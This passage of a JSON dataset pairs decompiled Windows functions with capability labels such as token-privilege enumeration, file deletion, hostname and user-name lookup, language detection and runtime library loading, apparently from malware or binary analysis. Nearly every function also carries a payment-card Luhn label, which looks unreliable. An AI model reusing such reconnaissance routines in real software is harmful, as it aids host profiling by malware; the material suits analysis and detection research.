            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048992c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x489941;\n    fcn.004058ec();\n    puStack20 = 0x489949;\n    fcn.004058ec();\n    uStack24 = 0x4899a9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    uVar1 = 1;\n    fcn.0042208c(1);\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x4899b0;\n    uStack28 = 0x4899a8;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 236
    },
    "004899f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004899f8(void)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack20 = 0x489a0c;\n    fcn.004058ec();\n    uStack24 = 0x489a92;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack36 = 0x489a75;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0040a1e4();\n    if (cVar1 == '\\0') {\n        fcn.00404f60();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x489a99;\n        uStack36 = 0x489a91;\n        fcn.0040546c();\n        return;\n    }\n    piVar2 = fcn.00404610();\n    (**(*piVar2 + 0x68))();\n    (**(*piVar2 + 0x1c))();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x489a7c;\n    uStack36 = 0x489a74;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 369
    },
    "00489aa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete file"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00489aa0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack20 = 0x489ab4;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack20 = 0x489abc;\n    fcn.004058ec();\n    uStack24 = 0x489b4f;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack36 = 0x489b2d;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack44 = 0x489ae0;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0040a1e4();\n    if (cVar1 != '\\0') {\n        uStack44 = fcn.004058fc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    var_ch = fcn.00404610();\n    (**(*var_ch + 0x2c))();\n    (**(*var_ch + 0x74))();\n    *in_FS_OFFSET = uStack44;\n    uStack36 = 0x489b34;\n    uStack40 = 0x489b2c;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 389
    },
    "00489d98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.00489d98(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint ReturnLength;\n    int32_t *TokenInformation;\n    uint TokenHandle;\n    uint *var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x489ee4;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    var_4h = in_EAX;\n    fcn.0040546c();\n    TokenInformation = fcn.00402ef0();\n    uVar1 = sub.kernel32.dll_GetCurrentProcess(0x28, &TokenHandle);\n    iVar2 = sub.advapi32.dll_OpenProcessToken(uVar1);\n    if (iVar2 == 0) {\n        fcn.0047294c();\n    }\n    iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, TokenInformation, 800, &ReturnLength);\n    if (iVar2 == 0) {\n        fcn.0047294c();\n    }\n    uVar1 = fcn.00402ef0();\n    uVar3 = fcn.00402ef0();\n    iVar2 = *TokenInformation;\n    if (-1 < iVar2 + -1) {\n        var_14h = 0;\n        do {\n            var_1ch = 0xff;\n            var_18h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, TokenInformation + var_14h * 3 + 1, uVar1, &var_18h);\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA(0, uVar1, uVar3, &var_1ch, &var_20h);\n            fcn.00405664(*var_4h);\n            fcn.00405664(0x489f40, 0);\n            TokenHandle = 0x489f4c;\n            fcn.00405800();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00402f0c();\n    fcn.00402f0c();\n    fcn.00402f0c();\n    *in_FS_OFFSET = TokenHandle;\n    fcn.00405490(0x489eeb);\n    return;\n}\n",
        "token_count": 614
    },
    "0048a16c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048a16c(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack100;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x48a277;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    piVar1 = fcn.00402ef0();\n    uVar2 = sub.kernel32.dll_GetCurrentProcess(0x28, &fcn.0048a16c::TokenHandle);\n    iVar3 = sub.advapi32.dll_OpenProcessToken(uVar2);\n    if (iVar3 == 0) {\n        sub.kernel32.dll_Sleep_1(1);\n    }\n    uStack100 = 0x48a1c5;\n    iVar3 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, piVar1, 800, &fcn.0048a16c::ReturnLength);\n    if (iVar3 == 0) {\n        uStack100 = 1;\n        sub.kernel32.dll_Sleep_1();\n    }\n    uVar2 = fcn.00402ef0();\n    var_10h = fcn.00402ef0();\n    iVar3 = *piVar1;\n    if (-1 < iVar3 + -1) {\n        var_ch = 0;\n        do {\n            var_14h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, piVar1 + var_ch * 3 + 1, uVar2, &fcn.0048a16c::var_14h);\n            uStack100 = 0;\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA();\n            fcn.00405664();\n            fcn.0048a02c();\n            var_ch = var_ch + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00402f0c();\n    fcn.00402f0c();\n    fcn.00402f0c();\n    *in_FS_OFFSET = uStack100;\n    fcn.0040546c(0x48a27e);\n    return;\n}\n",
        "token_count": 576
    },
    "0048a3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048a3c0(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x48a3dc;\n    fcn.004058ec();\n    puStack32 = 0x48a3e4;\n    fcn.004058ec();\n    uStack36 = 0x48a495;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48a469;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack32 = &stack0xfffffffc;\n    fcn.0048c938();\n    fcn.00405504();\n    iVar1 = fcn.00406858();\n    fcn.00406a14(iVar1 + 1);\n    fcn.00405800(param_2, 0x48a4ac, in_EAX);\n    *in_FS_OFFSET = param_2;\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x48a49c;\n    uStack48 = 0x48a494;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 359
    },
    "0048a918": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048a918(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48a92f;\n    fcn.004058ec();\n    uStack32 = 0x48a9fd;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48a945;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040546c();\n    uStack44 = 0x48a9d5;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00420f7c();\n    fcn.00421014();\n    fcn.00421158();\n    cVar1 = fcn.00421b80();\n    if (cVar1 == '\\0') {\n        fcn.0040546c();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421158();\n        cVar1 = fcn.00421ad8();\n        if (cVar1 != '\\0') {\n            fcn.004218dc();\n        }\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48aa04;\n    uStack32 = 0x48a9fc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 390
    },
    "0048aa34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048aa34(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48aa4b;\n    fcn.004058ec();\n    puStack28 = 0x48aa53;\n    fcn.004058ec();\n    uStack32 = 0x48ab13;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48aae7;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420f7c();\n    fcn.00421014();\n    fcn.00421158();\n    cVar1 = fcn.00421b80();\n    if (cVar1 == '\\0') {\n        fcn.0042107c();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421158();\n        fcn.0042187c();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48ab1a;\n    uStack32 = 0x48ab12;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 361
    },
    "0048b18c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b18c(void)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar1;\n    int32_t *piStack48;\n    uint uStack44;\n    uchar *puStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_14h;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_ch = NULL;\n    puStack28 = 0x48b1a5;\n    fcn.004058ec();\n    uStack32 = 0x48b258;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48b1c0;\n    puStack28 = &stack0xfffffffc;\n    fcn.0042b5f0();\n    puStack40 = 0x48b1d0;\n    fcn.0040713c();\n    puStack40 = 0x48b1da;\n    var_14h = fcn.00402ed8();\n    uStack44 = 0x48b22b;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00406360();\n    (**(*var_ch + 0x14))(var_ch, var_14h, 0);\n    piVar1 = var_ch;\n    (**(*var_ch + 0xc))(var_ch, 0xf);\n    *in_FS_OFFSET = piVar1;\n    fcn.00402f0c(0x48b232);\n    return;\n}\n",
        "token_count": 394
    },
    "0048b5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048b5d0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY88;\n    uint uStackY84;\n    uchar *puStackY80;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    puStack48 = &stack0xfffffffc;\n    uStack40 = 0x48b6b7;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    uStack52 = 0x48b697;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    func_0x00407abc();\n    fcn.00404610();\n    fcn.00405664();\n    puStackY80 = 0x48b644;\n    fcn.0041c0ac(0x48b6cc, 0);\n    uStackY84 = 0x48b686;\n    uStackY88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStackY80 = &stack0xfffffffc;\n    fcn.0041bd9c();\n    fcn.00461ef0();\n    *in_FS_OFFSET = uStackY88;\n    puStackY80 = 0x48b68d;\n    uStackY84 = 0x48b67d;\n    fcn.00404640();\n    uStackY84 = 0x48b685;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 416
    },
    "0048b764": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048b764(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 4;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00409ce8();\n    return;\n}\n",
        "token_count": 63
    },
    "0048b78c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b78c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48b7a3;\n    fcn.004058ec();\n    uStack32 = 0x48b885;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48b7b9;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040546c();\n    uStack44 = 0x48b858;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00420f7c();\n    fcn.00421014();\n    fcn.00421158();\n    cVar1 = fcn.00421b80();\n    if (cVar1 == '\\0') {\n        fcn.0040546c();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421158();\n        cVar1 = fcn.00421ad8();\n        if (cVar1 == '\\0') {\n            fcn.004054c0();\n        }\n        else {\n            fcn.004218dc();\n        }\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48b88c;\n    uStack32 = 0x48b884;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 405
    },
    "0048b8cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048b8cc(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48b8e3;\n    fcn.004058ec();\n    puStack28 = 0x48b8eb;\n    fcn.004058ec();\n    uStack32 = 0x48b9ab;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48b97f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420f7c();\n    fcn.00421014();\n    fcn.00421158();\n    cVar1 = fcn.00421b80();\n    if (cVar1 == '\\0') {\n        fcn.0042107c();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00421158();\n        fcn.0042187c();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48b9b2;\n    uStack32 = 0x48b9aa;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 367
    },
    "0048bb20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048bb20(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint hObject;\n    uint var_8h;\n    uint var_4h;\n    double dVar3;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x48bb37;\n    fcn.004058ec();\n    puStack32 = 0x48bb3f;\n    fcn.004058ec();\n    uStack36 = 0x48bbeb;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48bbbf;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x48bb68;\n    puStack32 = &stack0xfffffffc;\n    fcn.0040a0e4();\n    uStack60 = 0x48bbae;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fVar1 = fcn.0040d18c();\n    dVar3 = fVar1;\n    fcn.0040a7a0(SUB84(dVar3, 0), dVar3 >> 0x20);\n    uVar2 = SUB84(dVar3, 0);\n    fcn.0040a324();\n    *in_FS_OFFSET = uVar2;\n    uStack64 = 0x48bbb5;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 427
    },
    "0048bbfc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048bbfc(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48bc19;\n    fcn.00405f08();\n    uStack24 = 0x48bc8b;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    iStack32 = fcn.004058fc();\n    iVar1 = sub.kernel32.dll_LoadLibraryA();\n    if (iVar1 != 0) {\n        pcVar2 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x48bc9c);\n        (*pcVar2)();\n        sub.kernel32.dll_FreeLibrary_1();\n        iStack32 = iVar1;\n    }\n    *in_FS_OFFSET = iStack32;\n    uStack24 = 0x48bc92;\n    iStack28 = 0x48bc7c;\n    fcn.0040546c();\n    iStack28 = 0x48bc8a;\n    fcn.00405fcc();\n    return;\n}\n",
        "token_count": 324
    },
    "0048beb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get session user name"
        ],
        "decompiled_code": "\nvoid fcn.0048beb0(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.advapi32.dll_GetUserNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0048be9c();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0048beec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.0048beec(void)\n\n{\n    int32_t iVar1;\n    uint uStack264;\n    uchar auStack260 [256];\n    \n    uStack264 = 0x100;\n    iVar1 = sub.kernel32.dll_GetComputerNameA(auStack260, &uStack264);\n    if (iVar1 == 0) {\n        fcn.0040546c();\n    }\n    else {\n        fcn.0048be9c();\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "0048c21c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c21c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48c279;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004218dc();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 139
    },
    "0048c438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c438(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48c495;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004218dc();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 138
    },
    "0048c500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c500(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x48c55d;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.00420f38();\n    fcn.00421014();\n    fcn.00421158();\n    fcn.004218dc();\n    fcn.00404640();\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 139
    },
    "0048c8a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "identify system language via API"
        ],
        "decompiled_code": "\nvoid fcn.0048c8a8(void)\n\n{\n    ushort uVar1;\n    uchar auStack108 [104];\n    \n    uVar1 = sub.kernel32.dll_GetUserDefaultLangID();\n    sub.kernel32.dll_VerLanguageNameA(uVar1, auStack108, 100);\n    fcn.004056dc();\n    return;\n}\n",
        "token_count": 77
    },
    "0048cb44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0048cb44(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint *puStack36;\n    uint uStack28;\n    uint uStack20;\n    \n    uVar5 = 0;\n    uStack20 = 0;\n    iVar4 = 0;\n    puStack36 = &uStack20;\n    uStack40 = 0;\n    uStack44 = 0;\n    uStack48 = 1;\n    uStack52 = in_EAX;\n    uStack28 = param_2;\n    iVar1 = sub.advapi32.dll_GetTokenInformation();\n    if (iVar1 == 0) {\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        if (iVar1 != 0x7a) {\n            return 0;\n        }\n        uVar2 = sub.kernel32.dll_GetProcessHeap(8, uStack40);\n        iVar4 = sub.kernel32.dll_HeapAlloc(uVar2);\n        uVar3 = uStack52;\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uStack52 = 0;\n        iVar1 = sub.advapi32.dll_GetTokenInformation(uVar2, 1, iVar4, uVar3, &uStack52);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    iVar1 = fcn.0048c978();\n    if (iVar1 != 0) {\n        uVar3 = sub.kernel32.dll_GetProcessHeap(0, iVar4);\n        iVar1 = sub.kernel32.dll_HeapFree(uVar3);\n        if (iVar1 != 0) {\n            uVar5 = 0xffffffff;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 438
    },
    "0048cbf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048cbf4(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint in_stack_fffffecc;\n    uint uStack296;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uchar auStack280 [272];\n    \n    puStack284 = 0x48cc05;\n    fcn.0040546c();\n    uStack288 = 0xffffffff;\n    uStack292 = 8;\n    uStack296 = 0x48cc0f;\n    puStack284 = &stack0xfffffee8;\n    uStack296 = sub.kernel32.dll_GetCurrentThread();\n    iVar1 = sub.advapi32.dll_OpenThreadToken();\n    if (iVar1 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0x3f0) {\n            in_stack_fffffecc = sub.kernel32.dll_GetCurrentProcess(8, &stack0xfffffed8);\n            iVar1 = sub.advapi32.dll_OpenProcessToken(in_stack_fffffecc);\n        }\n    }\n    if (iVar1 != 0) {\n        fcn.00403aac();\n        iVar1 = fcn.0048cb44();\n        if (iVar1 != 0) {\n            fcn.004056dc();\n        }\n        sub.kernel32.dll_CloseHandle_1(in_stack_fffffecc);\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "0048cf50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get memory capacity"
        ],
        "decompiled_code": "\nvoid fcn.0048cf50(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint lpBuffer;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_4h;\n    \n    puStack76 = &stack0xfffffffc;\n    puStack88 = &stack0xfffffffc;\n    uStack80 = 0x48d056;\n    uStack84 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack84;\n    uStack92 = 0x48d01c;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    lpBuffer = 0x20;\n    sub.kernel32.dll_GlobalMemoryStatus(&lpBuffer);\n    fcn.0048ba34(SUB108(var_1ch - var_18h, 0), var_1ch - var_18h >> 0x40);\n    fcn.0048ba34(var_1ch, 0x48d06c, 0);\n    fVar1 = var_18h;\n    uVar3 = fVar1 >> 0x20;\n    fcn.0048ba34(SUB104(fVar1, 0), uVar3, fVar1 >> 0x40, 0x48d078, 0);\n    uVar2 = 0x48d084;\n    fcn.00405800(0x48d084, 0);\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uVar3;\n    fcn.00405490(0x48d05d);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 457
    },
    "0048d098": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "extract resource via kernel32 functions"
        ],
